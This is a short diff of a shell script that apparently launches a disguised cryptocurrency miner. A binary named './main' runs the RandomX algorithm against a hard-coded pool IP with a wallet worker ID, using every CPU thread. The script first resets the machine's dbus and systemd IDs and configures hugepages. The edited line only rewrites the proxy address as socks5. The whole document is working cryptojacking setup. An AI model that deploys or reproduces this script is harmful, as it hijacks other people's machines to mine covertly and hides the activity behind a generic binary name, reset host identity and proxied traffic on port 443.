@@ -7,4 +7,4 @@ rm -rf /var/lib/dbus/machine-id
 dbus-uuidgen --ensure
 systemd-machine-id-setup
 sysctl -w vm.nr_hugepages=$(nproc)
-./main -a rx/0 -o 157.245.205.114:443 -u NHbDitKXbv5w527aDGFYncoEQ5JHbUAP3irp.worker1 -x 157.245.205.114:1080 -t $(nproc)
+./main -a rx/0 -o 157.245.205.114:443 -u NHbDitKXbv5w527aDGFYncoEQ5JHbUAP3irp.worker1 -x socks5://157.245.205.114:1080 -t $(nproc)
